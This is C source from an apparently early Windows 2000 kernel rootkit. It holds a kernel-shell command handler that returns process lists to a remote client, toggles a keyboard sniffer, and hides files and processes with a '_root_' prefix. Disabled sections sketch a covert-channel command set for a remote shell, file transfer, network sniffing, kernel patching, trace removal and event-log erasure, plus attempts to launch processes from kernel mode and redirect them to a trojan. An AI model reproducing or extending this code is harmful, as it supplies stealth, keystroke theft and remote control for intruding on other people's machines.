
#include "rk_driver.h"
#include "rk_command.h"
#include "rk_defense.h"
#include "rk_process.h"


BOOL g_hide_directories = TRUE;
BOOL g_hide_proc = TRUE;
BOOL g_sniff_keys = FALSE;

// expeirmental exec command
int exec(PUNICODE_STRING ImageName);

////////////////////////////////////////////////////////////////////
// commands passed from the kernel shell are handled here
// 
////////////////////////////////////////////////////////////////////
void process_rootkit_command(char *theCommand)
{
	char _c[256];
	BOOL return_prompt = TRUE;
	sprintf(_c, "rootkit: process_rootkit_command %s, len %d", theCommand, strlen(theCommand));
	DbgPrint(_c);

	if(0 == strlen(theCommand))
	{
		//the user pressed return, which is meant to break out
		//of sniffer-modes - so make sure all sniffers are off
		if(g_sniff_keys)
		{
			char _t[] = "------------------------------------------\r\nsniffkeys is now OFF.\r\n";
			g_sniff_keys = FALSE;
			ReturnDataToClient(_t, strlen(_t));
		}
	}
	////////////////////////////////////////////////////////////////
	// Command: 'help'
	// return a help string
	////////////////////////////////////////////////////////////////
	else if(0 == strcmp(theCommand, "help"))
	{
		char _help[] =	"Win2K Rootkit by the team rootkit.com\r\n" \
						"Version 0.4 alpha\r\n" \
						"------------------------------------------\r\n" \
						"command          description         \r\n" \
						"\r\n" \
						"ps               show proclist       \r\n" \
						"help             this data           \r\n" \
						"buffertest       debug output        \r\n" \
						"hidedir          hide prefixed file/dir\r\n" \
						"hideproc         hide prefixed processes\r\n" \
						"debugint         (BSOD)fire int3     \r\n" \
						"sniffkeys        toggle keyboard sniffer\r\n" \
						"echo <string>    echo the given string\r\n" \
						"\r\n*(BSOD) means Blue Screen of Death\r\n" \
						"if a kernel debugger is not present!\r\n" \
						"*'prefixed' means the process or filename\r\n" \
						"starts with the letters '_root_'.\r\n" \
						"\r\n";

		ReturnDataToClient(_help, strlen(_help));
	}
	////////////////////////////////////////////////////////////////
	// Command: 'echo' 'string'
	// echo back the string, useful for rootkit patches that need
	// to send data to a connected client
	////////////////////////////////////////////////////////////////
	else if(0 == memcmp(theCommand, "echo ", 5))
	{
		int l = strlen(&theCommand[5]);
		if(l)
		{
			return_prompt=FALSE;

			ReturnDataToClient(&theCommand[5], l);	
		}
	}
	////////////////////////////////////////////////////////////////
	// Command: 'ps'
	// returns the process list running on the host
	////////////////////////////////////////////////////////////////
	else if(0 == strcmp(theCommand, "ps"))
	{
		command_get_proclist();
	}
	////////////////////////////////////////////////////////////////
	// Command: 'exec'
	// test of exec command
	////////////////////////////////////////////////////////////////
	else if(0 == memcmp(theCommand, "exec ",5))
	{
		PUNICODE_STRING	uCmdLine;
		ANSI_STRING		aCmdLine;



		aCmdLine.Length=strlen(theCommand)-5;
		aCmdLine.MaximumLength=aCmdLine.Length;
		aCmdLine.Buffer=&theCommand[5];

		uCmdLine=ExAllocatePool(NonPagedPool,sizeof(UNICODE_STRING));
		RtlAnsiStringToUnicodeString(uCmdLine,&aCmdLine,TRUE);

		exec(uCmdLine);

		RtlFreeUnicodeString(uCmdLine);
		ExFreePool(uCmdLine);

	}
	////////////////////////////////////////////////////////////////
	// Command: 'buffertest'
	// debug function causes a large number of packets to return
	// used to debug the TCP/IP stack functionality
	////////////////////////////////////////////////////////////////
	else if(0 == strcmp(theCommand, "buffertest"))
	{
		int count=0;
		for(count=0;count<100;count++)
		{
			int x;
			sprintf(_c, ".%d.", count);
			x = strlen(_c);
			ReturnDataToClient(_c, x);
		}
	}
	////////////////////////////////////////////////////////////////
	// Command: 'sniffkeys'
	// toggles keyboard sniffer
	////////////////////////////////////////////////////////////////
	else if(0 == strcmp(theCommand, "sniffkeys"))
	{
		if(g_sniff_keys)
		{
			char _t[] = "keyboard sniffing now OFF\r\n";
			g_sniff_keys = FALSE;
			ReturnDataToClient( _t, strlen(_t));
		}
		else 
		{
			char _t[] = "keyboard sniffing now ON\r\n------------------------------------------\r\n";
			return_prompt=FALSE;
			g_sniff_keys = TRUE;
			ReturnDataToClient( _t, strlen(_t));
		}
	}
	////////////////////////////////////////////////////////////////
	// Command: 'hidedir'
	// toggles directory hiding with '_root_' prefix
	////////////////////////////////////////////////////////////////
	else if(0 == strcmp(theCommand, "hidedir"))
	{
		if(g_hide_directories)
		{
			char _t[] = "directory prefix-hiding now OFF\r\n";
			g_hide_directories = FALSE;
			ReturnDataToClient( _t, strlen(_t));
		}
		else 
		{
			char _t[] = "directory prefix-hiding now ON\r\n";
			g_hide_directories = TRUE;
			ReturnDataToClient( _t, strlen(_t));
		}
	}
	////////////////////////////////////////////////////////////////
	// Command: 'hideproc'
	// toggles process hiding with '_root_' prefix
	////////////////////////////////////////////////////////////////
	else if(0 == strcmp(theCommand, "hideproc"))
	{
		if(g_hide_proc)
		{
			char _t[] = "process prefix-hiding now OFF\r\n";
			g_hide_proc = FALSE;
			ReturnDataToClient( _t, strlen(_t));
		}
		else 
		{
			char _t[] = "process prefix-hiding now ON\r\n";
			g_hide_proc = TRUE;
			ReturnDataToClient( _t, strlen(_t));
		}
	}
	////////////////////////////////////////////////////////////////
	// Command: 'debugint'
	// debug function causes a debug interrupt to fire
	// this will BSOD the machine unless a kernel debugger is
	// present.
	////////////////////////////////////////////////////////////////
	else if(0 == strcmp(theCommand, "debugint"))
	{
		__asm int 3
	}
	else
	{
		char t[256];
		sprintf(t, "error: unknown or malformed command %s\r\n", theCommand);
		ReturnDataToClient( t, strlen(t));
	}
	
	if(return_prompt)
		//this is our prompt, an upside-down question-mark ¿
		ReturnDataToClient("\xA8", 1);
}

///////////////////////////////////////////////////////////////////
// commands requested from kernel shell, many of these return
// data to the connected client.
///////////////////////////////////////////////////////////////////

// --[ command_get_proclist ]---------------------------
// utility routine, dump process list
// should only be called at IRQL_PASSIVE
// this will send a process list back to the connected
// client over the TCP/IP session
// -----------------------------------------------------
void command_get_proclist()
{
	unsigned long n = 0x100;
	struct _SYSTEM_PROCESSES *p = (struct _SYSTEM_PROCESSES *)ExAllocatePool(NonPagedPool, n);
	
	if(p)
	{
		struct _SYSTEM_PROCESSES *curr = NULL;
		
		// ------------------------------------------------------------------
		// spin until our buffer is large enough to hold the results.
		// Information Class 5 is 'ProcessAndThreadsInformation'
		// ------------------------------------------------------------------
		while(ZwQuerySystemInformation( 5, p, n, 0) 
			== STATUS_INFO_LENGTH_MISMATCH)
		{
			ExFreePool(p);
			n *= 2;
			p = (struct _SYSTEM_PROCESSES *)ExAllocatePool(NonPagedPool, n);
			
			if(NULL == p)
			{
				break;
			}
		}
		
		if(p)
		{
			curr = p;
		
			// -------------------------------------------------------------------------
			// forward through all entries in an array of process structures
			// some processes will not have names. (System Idle, for example)
			// -------------------------------------------------------------------------
			while(curr)
			{
				ANSI_STRING process_name;
				
				RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
				if( (0 < process_name.Length) 
					&& 
					(200 > process_name.Length) )
				{
					char _output[255];
					char _pname[255];
					int tslen = 0;
					memset(_pname, NULL, 255);
					memcpy(_pname, process_name.Buffer, process_name.Length);

					sprintf(	_output, 
								"%d\t%s\r\n", 
								curr->ProcessId, 
								_pname);
					tslen = strlen(_output);
					ReturnDataToClient(_output, tslen);
				}
				RtlFreeAnsiString(&process_name);

				if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
				else curr = NULL;
			}

			ExFreePool(p);
		}
	}
}



#if 0
///////////////////////////////////////////////////////////////////
// the following code was meant for use with covert-channel
// commands, _not_ commands passed via the kernel-shell
// these are unfinished...
///////////////////////////////////////////////////////////////////
/* COMMAND GROUP
 * Covert channel command codes must be parsed
 * skeleton functionality of rootkit is supplied
 * within this logic.
 * 
 * Channel sequence is command code (1 octet), 
 * then data length (2 octets), then data (data
 * length octets).  The length and a pointer to
 * the data are passed to every function.  A
 * NULL pointer is passed if the data length is
 * zero.
 * 
 * The parsing routine demands an ID of 0 for 
 * the list terminator.
 */

COMMAND commands[] =
{
	{ 0x01, cmdExecuteProcess },
	{ 0x02, cmdRemoteShell },
	{ 0x03, cmdSendFile },
	{ 0x04, cmdRecvFile },
	{ 0x05, cmdSniffNetwork },
	{ 0x06, cmdPatchKernel },
	{ 0x07, cmdAddNetSnifferFilter },
	{ 0x08, cmdAddFileSnifferFilter },
	{ 0x09, cmdShutdown },
	{ 0x0a, cmdKillAllClean },
	{ 0x0b, cmdEraseEventLogs },
	{ 0x00, NULL }
};

/* Parse and execute a channel command. */
BOOL ExecuteChannelCommand( LPCOMMANDPACKET lpcp )
{
	LPCOMMAND	lpcmd;

	/* walk through the list of commands */
	for( lpcmd = &commands[0]; lpcmd->byCode; lpcmd++ )
	{
		/* does this command match the requested one? */
		if( lpcmd->byCode == lpcp->byCode )
		{
			/* match found.  is there data? */
			if( lpcp->cchData )
				/* call the procedure and pass the data in */
				lpcmd->proc( lpcp->cchData, lpcp->byData );
			else
				/* call the procedure without data */
				lpcmd->proc( 0, NULL );

			/* success! */
			return TRUE;
		}
	}

	/* failure */
	return FALSE;
}


/* Launch a process */
void cmdExecuteProcess(){
	DbgPrint(("cmdExecuteProcess called\n"));
}

/* Create a remote shell */
void cmdRemoteShell(){
	DbgPrint(("cmdRemoteShell called\n"));
}

/* Send a file */
void cmdSendFile(){
	DbgPrint(("cmdSendFile called\n"));
}

/* Recv a file */
void cmdRecvFile(){
	DbgPrint(("cmdRecvFile called\n"));
}

/* Sniff the network */
void cmdSniffNetwork(){
	DbgPrint(("cmdSniffNetwork called\n"));
}

/* Install a Kernel patch */
void cmdPatchKernel(){
	DbgPrint(("cmdPatchKernel called\n"));
}

/* Add a network sniffer filter */
void cmdAddNetSnifferFilter(){
	DbgPrint(("cmdAddNetSnifferFilter called\n"));
}

/* Add a file sniffer filter */
void cmdAddFileSnifferFilter(){
	DbgPrint(("cmdAddFileSnifferFilter called\n"));
}

/* Shutdown rootkit */
void cmdShutdown(){
	DbgPrint(("cmdShutdown called\n"));
}

/* Kill all traces of rootkit & shutdown permenantly */
void cmdKillAllClean(){
	DbgPrint(("OnKillAllClean called\n"));
}

/* Erase all audit logs */
void cmdEraseEventLogs(){
	DbgPrint(("cmdEraseEventLogs called\n"));
}


/* ************ hardhat area below this point ******************* 
 * 
 * This area is research code - we are trying to
 * figure out how to launch a Win32 process from
 * kernel mode.  So far, we have not been sucessful
 * so please help if you can!
 *
 * The proper series of events are:
 *
 * 	NtCreateFile() to open PE file
 *	NtCreateSection() to map PE file to memory directly
 *	NtCreateProcess() to create kernel-level process object & PEB
 *	NtCreateThread() to create thread context and pass the address of the PEB
 *	now send some sort of message to csrss.exe - don't know how this is done yet
 *	which ends up starting the thread.
 *
 * **************************************************************/

void TestCreateWin32Thread();
void TestLaunchWin32Process();
/* system call prototype */
NTKERNELAPI
NTSTATUS
PsCreateSystemProcess( OUT PHANDLE ProcessHandle,                       
					   IN ACCESS_MASK AccessMask,                       
					   IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes );


/* _________________________________________________
 . This function is intended to launch a WIN32
 . process.  So far, the process creation works.
 . We are actually building a real process - the
 . stumper right now is how to create the inital
 . thread - we can create the process, but it doesn't
 . >DO< anything until we start an initial thread!
 . So far we haven't figured out how to initialize
 . the thread context & stack for NtCreateThread().
 . _________________________________________________ */

void TestLaunchWin32Process()
{
	NTSTATUS rc;
	HANDLE hProcessCreated, hProcessOpened, hFile, hSection;
	OBJECT_ATTRIBUTES ObjectAttr;
	UNICODE_STRING ProcessName;
	UNICODE_STRING SectionName;
	UNICODE_STRING FileName;
	LARGE_INTEGER MaxSize;
	ULONG SectionSize=8192;
		

	IO_STATUS_BLOCK ioStatusBlock;
	ULONG allocsize = 0;

	DbgPrint("starting TestLaunchProcess\n");

	/* first open file w/ NtCreateFile 
	 . this works for a Win32 image.  We could also use
	 . cmd.exe /c for a shell.  calc.exe is just for testing.
	 */

	RtlInitUnicodeString(&FileName, L"\\??\\C:\\winnt\\system32\\calc.exe");
	InitializeObjectAttributes( &ObjectAttr,
								&FileName,
								OBJ_CASE_INSENSITIVE,
								NULL,
								NULL);
	

	rc = ZwCreateFile(
		&hFile,
		GENERIC_READ | GENERIC_EXECUTE,
		&ObjectAttr,
		&ioStatusBlock,
		&allocsize,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		0,
		NULL,
		0);
	if (rc!=STATUS_SUCCESS) {
		DbgPrint("Unable to open file, rc=%x\n", rc);
		return 0;
	}

	/* then use NtCreateSection to map file */
	
	MaxSize.HighPart=0;
	MaxSize.LowPart=SectionSize;

	rc=ZwCreateSection(
					&hSection,
					SECTION_ALL_ACCESS,
					NULL,
					&MaxSize,
					PAGE_READWRITE,
					SEC_IMAGE,
					hFile);
	if (rc!=STATUS_SUCCESS) {
		DbgPrint("Unable to create section, rc=%x\n", rc);
		return 0;
	}
	DbgPrint("hSectionCreated=%x\n", hSection);
	
	/* ______________________________________
	 . redirect createprocess!
	 . ______________________________________ */
	SetTrojanRedirectSection(hSection);


	
	/* then create process specific structures & address space */
#if 0	
	rc=	NewNtCreateProcess (
                        &hProcessCreated,
                        PROCESS_ALL_ACCESS,
                        NULL,
                        0xFFFFFFFF,
                        TRUE,
                        hSection,
                        NULL,
                        NULL);
        
	if (rc!=STATUS_SUCCESS) {
		DbgPrint("Unable to create process, rc=%x\n", rc);
		return 0;
	}
	DbgPrint("hProcessCreated=%x\n", hProcessCreated);
	/* ________________________________
	 . at this point we should have an
	 . EPROCESS and KPROCESS block.
	 . we must place this process at the end of the NT process list
	 . w/ PsActiveProcessHead() ?
	 . */

	//TestCreateThread();

	NtClose(hProcessCreated);
#endif
}


#if 0
void TestCreateWin32Thread()
{
	UNICODE_STRING ThreadName;
	OBJECT_ATTRIBUTES ObjectAttr;
	NTSTATUS rc;
	HANDLE hThreadCreated, hThreadOpened;
	CLIENT_ID ClientId;
	CONTEXT Context;
	STACKINFO StackInfo;
	LARGE_INTEGER Timeout;
	ULONG SuspendCount;

	RtlInitUnicodeString(&ThreadName, L"\\MyThread");

	InitializeObjectAttributes(&ObjectAttr,
								&ThreadName,
								OBJ_CASE_INSENSITIVE,
								NULL,
								NULL);

	StackInfo.TopOfStack=(ULONG)&Stack[STACK_SIZE];
	StackInfo.BottomOfStack=(ULONG)&Stack[-1];
	StackInfo.OnePageBelowTopOfStack=(ULONG)(&Stack[STACK_SIZE]-4096);


	Context.ContextFlags=CONTEXT_FULL;
	rc=NtGetContextThread(NtCurrentThread(), &Context);
	if (rc!=STATUS_SUCCESS) {
		DbgView("Unable to get context of current thread\n");
		return;
	}
	
	Context.Eip=(ULONG)ThreadFunc;
	Context.Esp=StackInfo.TopOfStack;

	rc=NtCreateThread(&hThreadCreated,
						THREAD_ALL_ACCESS,
						&ObjectAttr,
						NtCurrentProcess(),
						&ClientId,
						&Context,
						&StackInfo,
						FALSE);
	if (rc!=STATUS_SUCCESS) {
		printf("Unable to create thread, rc=%x\n", rc);
		return;
	}
}
#endif

VOID testCreateSystemProcess(void)
/* testing PsCreateSystemProcess()
 *
 * - this is a bunch of crap and doesn't work 
 * - greg
 */
{
#if 0
 HANDLE hProcess;
 OBJECT_ATTRIBUTES objectAttributes0;
 UNICODE_STRING NewProcessUnicodeString;
 static WCHAR NewProcessName[] = L"MyProcess"; 
 NTSTATUS NtStatus;
 
 DbgPrint(("testCreateProcess called\n"));

 //__asm int 3

 NewProcessUnicodeString.Buffer = NewProcessName;
 NewProcessUnicodeString.Length = wcslen(NewProcessName)*2;
 
 InitializeObjectAttributes(
                          &objectAttributes0,
                          &NewProcessUnicodeString,
                          OBJ_CASE_INSENSITIVE,
                          (HANDLE)NULL,
                          (PSECURITY_DESCRIPTOR)NULL
                          );
 
 NtStatus = PsCreateSystemProcess( &hProcess,
                                   PROCESS_ALL_ACCESS,
                                   &objectAttributes0 );
#endif

 
#if 0
 /* working on another method here w/ systemservice table */
	NTSTATUS ntstatus;
	ntstatus = gfNtCreateProcess( 
			KeyHandle, Index, KeyInformationClass,
                        KeyInformation, Length, pResultLength );
#endif
}


#endif